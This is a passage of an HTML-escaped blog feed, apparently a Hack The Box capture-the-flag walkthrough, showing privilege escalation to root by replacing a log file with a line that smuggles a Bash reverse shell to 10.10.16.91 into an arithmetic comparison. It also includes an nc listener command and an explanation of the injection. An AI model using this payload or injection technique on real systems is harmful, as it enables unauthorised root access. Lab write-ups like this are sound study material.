+&lt;h3 id="1-check-the-user-permission-for-modifying-or-deleting-the-file-applicationlog">1. Check the user permission for modifying or deleting the file &lt;strong>application.log&lt;/strong>&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">groups
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls -l /var/www/web/user-management-service/log/application.log
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250429143020-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250429114119-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>We dont have modification/edit permission on the file &lt;strong>aplication.log&lt;/strong> as a &lt;em>developers group user&lt;/em>&lt;/p>
+&lt;p>Lets check whether we have a permission of its parent directory so we can remove or
+replace this file:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls -l /var/www/web/user-management-service/log/
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls -ld /var/www/web/user-management-service/log/
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250429143545-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>This time we see that a developers group members have the permission of full rights to modify the directory means we can delete and replace the &lt;strong>aplication.log&lt;/strong> file.&lt;/p>
+&lt;h3 id="2-open-the-reverse-shell">2. Open the Reverse Shell:&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo rlwrap nc -nlvp &lt;span class="m">80&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="3-remove-the-applicationlog-from-the-directory">3. Remove the application.log from the directory:&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">rm -f /var/www/web/user-management-service/log/application.log
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="4-create-the-malicious-applicationlog-on-the-target-directly-for-root">4. Create the malicious application.log on the target directly for root:&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s1">&amp;#39;HTTP Status: x[$(/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.91/80 0&amp;gt;&amp;amp;1)]&amp;#39;&lt;/span> &amp;gt; /var/www/web/user-management-service/log/application.log
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250429153239-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h3 id="why-this-worked-">&lt;strong>Why This Worked ?&lt;/strong>&lt;/h3>
+&lt;ul>
+&lt;li>
+&lt;p>The &lt;code>x[$(...)]&lt;/code> structure **forces Bash to evaluate the command inside &lt;code>$()&lt;/code> ** before arithmetic comparison (&lt;code>-eq&lt;/code>).&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Here’s what happens step-by-step:&lt;/p>
+&lt;ol>
+&lt;li>The script extracts &lt;code>x[$(/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.91/80 0&amp;gt;&amp;amp;1)]&lt;/code> as the &amp;ldquo;status code.&amp;rdquo;&lt;/li>
+&lt;li>When the script runs &lt;code>[[ &amp;quot;$code&amp;quot; -eq &amp;quot;some_number&amp;quot; ]]&lt;/code>, Bash:&lt;br>
+&lt;strong>First tries to evaluate &lt;code>x[$(...)]&lt;/code> as an arithmetic expression&lt;/strong>.
+&lt;ul>
+&lt;li>Since&lt;code>x[&lt;/code> is not a valid number Bash &lt;strong>executes the command substitution &lt;code>$(...)&lt;/code>&lt;/strong> as a fallback.&lt;/li>
+&lt;li>The reverse shell triggers &lt;strong>before&lt;/strong> the comparison fails.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;/ul>
+&lt;h4 id="check-the-listener">&lt;strong>Check the Listener:&lt;/strong>&lt;/h4>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250429153508-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="alhamdulillah-root-done">&lt;strong>ALHAMDULILLAH&lt;/strong> ROOT DONE&lt;/h2></description></item><item><title>Vintage</title><link>http://localhost:1313/blog/vintage-htb/</link><pubDate>Sat, 10 May 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/blog/vintage-htb/</guid><description>&lt;div style="text-align: center; font-size: 2em; font-weight: bold; color: MediumSpringGreen;">
 VINTAGE-HTB-ACTIVE DIRECTORY
 &lt;/div>
 &lt;h2 id="1-nmap-scan">1. &lt;strong>NMAP-SCAN&lt;/strong>:&lt;/h2>
